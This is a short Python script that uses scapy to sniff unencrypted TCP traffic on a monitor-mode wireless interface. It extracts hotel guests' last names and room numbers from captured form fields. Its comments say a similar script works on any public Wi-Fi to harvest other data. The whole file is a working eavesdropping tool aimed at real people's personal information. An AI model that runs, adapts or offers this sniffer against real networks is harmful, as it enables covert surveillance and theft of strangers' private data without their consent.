#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Wed May 16 20:52:40 2018

@author: starboy
"""
# Script sniffs packets and finds if there is any information regarding guests.

# Run wireshark yourself to check the format of the packets or the text in the 
# packetsor check if the packets are encrypted(low chance of that happening)

# Similar script will also work in any public place wifi to sniff for other kinds 
# of data 

import re
import optparse
from scapy.all import *

def find_guest_data(pkt):
	raw = pkt.sprintf('%Raw.load%')
	name = re.findall('(?i)LAST_NAME=(.*)&', raw)
	room = re.findall('(?i)ROOM_NUMBER=(.*)&', raw)
	
	if name:
		print ('[+] Found Hotel Guest: '+str(name[0])+ ' Room# '+ str(room[0]) )


# Option parsing
parser = optparse.OptionParser('usage % prog -i <interface>')
parser.add_option('-i', dest='interface', type='string', help='specify interface in monitor mode to listen on') 
(options, args) = parser.parse_args()
if options.interface == None:
	print (parser.usage)
	exit(0)

else:
	conf.iface = options.interface

try: 
	sniff(filter='tcp', prn=find_guest_data, store=0)
except KeyboardInterrupt:
	exit(0)


